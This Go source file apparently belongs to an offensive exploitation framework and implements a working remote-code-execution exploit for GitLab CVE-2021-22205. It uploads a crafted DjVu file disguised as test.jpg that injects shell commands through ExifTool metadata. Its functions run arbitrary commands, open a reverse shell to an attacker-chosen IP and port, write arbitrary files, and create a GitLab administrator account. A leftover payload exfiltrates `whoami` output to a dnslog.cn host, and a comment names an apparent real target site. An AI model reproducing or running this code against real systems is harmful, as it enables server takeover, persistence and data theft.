package exp_gitlab

import (
	"encoding/base64"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"regexp"
	"strings"
	"time"
)

type Exp_CVE_2021_22205 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_22205) subcmd1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	data := "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.k8rymy.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"

	data = "AT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{{{cmd}}} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n"
	b64payload := base64.StdEncoding.EncodeToString([]byte(cmd))

	expUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/aaaaaaaaaaaa")

	sectionLen := 20
	allLen := len(b64payload)
	currentLen := 0
	lastLen := 0
	section := ""
	cmdFormat := "echo -n %s >> b64.txt"
	firstcmdFormat := "echo -n %s > b64.txt"
	// 分段传输
	for {
		if currentLen+sectionLen >= allLen {
			lastLen = allLen
		} else {
			lastLen = currentLen + sectionLen

		}
		section = b64payload[currentLen:lastLen]
		sendData := ""
		if currentLen == 0 {
			sendData = strings.ReplaceAll(data, "{{cmd}}", fmt.Sprintf(firstcmdFormat, section))
		} else {
			sendData = strings.ReplaceAll(data, "{{cmd}}", fmt.Sprintf(cmdFormat, section))
		}
		multiParts := []lzhttp.PostMultiPart{
			{
				FieldName:   "file",
				FileName:    "test.jpg",
				ContentType: "image/jpeg",
				Content:     []byte(sendData),
			},
		}
		httpresp := self.HttpPostMulti(expUrl, multiParts, headers)
		if httpresp.Err != nil {
			self.EchoErrMsg(fmt.Sprintf("error: %s, sleep 1s", httpresp.Err.Error()))
			time.Sleep(time.Second)
			continue
		}
		currentLen = lastLen
		if currentLen >= allLen {
			break
		}
	}

	// 执行命令
	sendData := strings.ReplaceAll(data, "{{cmd}}", "nohup cat b64.txt | base64 -d | /bin/bash  > /dev/null 2>&1 &")
	//self.Params.Timeout = 120 * time.Second
	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "file",
			FileName:    "test.jpg",
			ContentType: "image/jpeg",
			Content:     []byte(sendData),
		},
	}
	httpresp := self.HttpPostMulti(expUrl, multiParts, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	sendData = strings.ReplaceAll(data, "{{cmd}}", "rm -rf b64.txt")
	//self.Params.Timeout = 10 * time.Second
	multiParts = []lzhttp.PostMultiPart{
		{
			FieldName:   "file",
			FileName:    "test.jpg",
			ContentType: "image/jpeg",
			Content:     []byte(sendData),
		},
	}
	httpresp = self.HttpPostMulti(expUrl, multiParts, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	if httpresp.Resp.StatusCode == 422 {
		self.EchoSuccessMsg("无回显，请自行检查")
	} else {
		self.EchoSuccessMsg("利用失败，请自行检查")
	}
	return
}

func (self *Exp_CVE_2021_22205) subcmd2(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	initUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/users/sign_in")
	httpresp := self.HttpGetWithoutRedirect(initUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	tokenPattern := `name="csrf-token"\s+content="(.*?)"`
	tmp := regexp.MustCompile(tokenPattern).FindStringSubmatch(httpresp.Body)
	if len(tmp) < 1 {
		self.EchoErrMsg("未获取到token")
		return
	}
	csrfToken := tmp[1]
	self.EchoSuccessMsg("获取到CSRF-TOKEN: " + csrfToken)

	cookies := httpresp.Resp.Header.Values("Set-Cookie")
	for _, cookie := range cookies {
		if strings.Contains(cookie, "experimentation_subject_id") {
			self.EchoSuccessMsg("获取到Cookie experimentation_subject_id")
		}
		if strings.Contains(cookie, "_gitlab_session") {
			self.EchoSuccessMsg("获取到Cookie _gitlab_session")
		}
		headers.Add("Cookie", cookie)
	}

	data := "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.k8rymy.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"

	data = "AT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{{{cmd}}} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n"
	b64payload := base64.StdEncoding.EncodeToString([]byte(cmd))

	expUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/uploads/user")
	headers.Set("X-CSRF-Token", csrfToken)

	sectionLen := 20
	allLen := len(b64payload)
	currentLen := 0
	lastLen := 0
	section := ""
	cmdFormat := "echo -n %s >> b64.txt"
	firstcmdFormat := "echo -n %s > b64.txt"
	// 分段传输
	for {
		if currentLen+sectionLen >= allLen {
			lastLen = allLen
		} else {
			lastLen = currentLen + sectionLen

		}
		section = b64payload[currentLen:lastLen]
		sendData := ""
		if currentLen == 0 {
			sendData = strings.ReplaceAll(data, "{{cmd}}", fmt.Sprintf(firstcmdFormat, section))
		} else {
			sendData = strings.ReplaceAll(data, "{{cmd}}", fmt.Sprintf(cmdFormat, section))
		}
		multiParts := []lzhttp.PostMultiPart{
			{
				FieldName:   "file",
				FileName:    "test.jpg",
				ContentType: "image/jpeg",
				Content:     []byte(sendData),
			},
		}
		httpresp = self.HttpPostMulti(expUrl, multiParts, headers)
		if httpresp.Err != nil {
			self.EchoErrMsg(fmt.Sprintf("error: %s, sleep 1s", httpresp.Err.Error()))
			time.Sleep(time.Second)
			continue
		}
		currentLen = lastLen
		if currentLen >= allLen {
			break
		}
	}

	// 执行命令
	sendData := strings.ReplaceAll(data, "{{cmd}}", "nohup cat b64.txt | base64 -d | /bin/bash  > /dev/null 2>&1 &")
	//self.Params.Timeout = 120 * time.Second
	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "file",
			FileName:    "test.jpg",
			ContentType: "image/jpeg",
			Content:     []byte(sendData),
		},
	}
	httpresp = self.HttpPostMulti(expUrl, multiParts, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	sendData = strings.ReplaceAll(data, "{{cmd}}", "rm -rf b64.txt")
	//self.Params.Timeout = 10 * time.Second
	multiParts = []lzhttp.PostMultiPart{
		{
			FieldName:   "file",
			FileName:    "test.jpg",
			ContentType: "image/jpeg",
			Content:     []byte(sendData),
		},
	}
	httpresp = self.HttpPostMulti(expUrl, multiParts, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	if strings.Contains(httpresp.Body, "Failed to process image") {
		self.EchoSuccessMsg("利用成功，无回显")
	} else {
		self.EchoErrMsg("利用失败，请自行检查")
	}
	return
}

func (self *Exp_CVE_2021_22205) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	cmd = strings.ReplaceAll(cmd, `"`, `\"`)

	data := "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.k8rymy.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"

	data = "AT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{{{cmd}}} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n"

	data = strings.ReplaceAll(data, "{{cmd}}", cmd)
	expUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/aaaaaaaaaaaaaaa")
	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "file",
			FileName:    "test.jpg",
			ContentType: "image/jpeg",
			Content:     []byte(data),
		},
	}
	httpresp := self.HttpPostMulti(expUrl, multiParts, headers)

	//headers.Set("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5")
	//self.HttpPostWithoutRedirect(expUrl, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	if httpresp.Resp.StatusCode == 422 {
		self.EchoSuccessMsg("无回显，请自行检查")
	} else {
		self.EchoSuccessMsg("利用失败，请自行检查")
	}

	return
}
func (self *Exp_CVE_2021_22205) Attack_reverse1() (expResult exp_model.ExpResult) {
	ip := self.MustGetStringParam("ip")
	port := self.MustGetStringParam("port")
	rs := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)
	return self.subcmd1(rs)
}

func (self *Exp_CVE_2021_22205) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	content = base64.StdEncoding.EncodeToString([]byte(content))
	cmd := fmt.Sprintf("echo %s | base64 -d > %s", content, filename)
	expResult = self.subcmd1(cmd)
	if expResult.Err == "" {
		expResult.Status = true
	}
	return
}
func (self *Exp_CVE_2021_22205) Attack_adduser1() (expResult exp_model.ExpResult) {
	// 默认配置
	payload := `echo 'user = User.new(username: "%s", email: "%s@example.com", name: "%s", password: "%s", password_confirmation: "%s");user.admin="true";user.skip_confirmation!;user.save!' | gitlab-rails console`
	username := self.MustGetStringParam("username")
	password := self.MustGetStringParam("password")
	payload = fmt.Sprintf(payload, username, username, username, password, password)

	expResult = self.subcmd1(payload)
	return
}

// http://git.jundam.cn:88/
func (self *Exp_CVE_2021_22205) Attack_cmd2() (expResult exp_model.ExpResult) {
	// 默认配置
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	cmd = strings.ReplaceAll(cmd, `"`, `\"`)
	initUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/users/sign_in")
	httpresp := self.HttpGetWithoutRedirect(initUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	tokenPattern := `name="csrf-token"\s+content="(.*?)"`
	tmp := regexp.MustCompile(tokenPattern).FindStringSubmatch(httpresp.Body)
	if len(tmp) < 1 {
		self.EchoErrMsg("未获取到token")
		return
	}
	csrfToken := tmp[1]
	self.EchoSuccessMsg("获取到CSRF-TOKEN: " + csrfToken)

	cookies := httpresp.Resp.Header.Values("Set-Cookie")
	for _, cookie := range cookies {
		if strings.Contains(cookie, "experimentation_subject_id") {
			self.EchoSuccessMsg("获取到Cookie experimentation_subject_id")
		}
		if strings.Contains(cookie, "_gitlab_session") {
			self.EchoSuccessMsg("获取到Cookie _gitlab_session")
		}
		headers.Add("Cookie", cookie)
	}

	data := "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.k8rymy.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"

	data = "AT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{{{cmd}}} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n"

	data = strings.ReplaceAll(data, "{{cmd}}", cmd)
	expUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/uploads/user")
	headers.Set("X-CSRF-Token", csrfToken)
	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "file",
			FileName:    "test.jpg",
			ContentType: "image/jpeg",
			Content:     []byte(data),
		},
	}
	httpresp = self.HttpPostMulti(expUrl, multiParts, headers)

	//headers.Set("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5")
	//self.HttpPostWithoutRedirect(expUrl, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	if strings.Contains(httpresp.Body, "Failed to process image") {
		self.EchoSuccessMsg("利用成功，无回显，请自行检查")
	} else {
		self.EchoSuccessMsg("利用失败，请自行检查")
	}

	return
}

func (self *Exp_CVE_2021_22205) Attack_reverse2() (expResult exp_model.ExpResult) {
	ip := self.MustGetStringParam("ip")
	port := self.MustGetStringParam("port")
	rs := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)
	return self.subcmd2(rs)
}

func (self *Exp_CVE_2021_22205) Attack_upload2() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	content = base64.StdEncoding.EncodeToString([]byte(content))
	cmd := fmt.Sprintf("echo %s | base64 -d > %s", content, filename)
	expResult = self.subcmd2(cmd)
	if expResult.Err == "" {
		expResult.Status = true
	}
	return
}
func (self *Exp_CVE_2021_22205) Attack_adduser2() (expResult exp_model.ExpResult) {
	// 默认配置
	payload := `echo 'user = User.new(username: "%s", email: "%s@example.com", name: "%s", password: "%s", password_confirmation: "%s");user.admin="true";user.skip_confirmation!;user.save!' | gitlab-rails console`
	username := self.MustGetStringParam("username")
	password := self.MustGetStringParam("password")
	payload = fmt.Sprintf(payload, username, username, username, password, password)

	expResult = self.subcmd2(payload)
	return
}
func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2021_22205{}, "exp_CVE_2021_22205.yml")

}
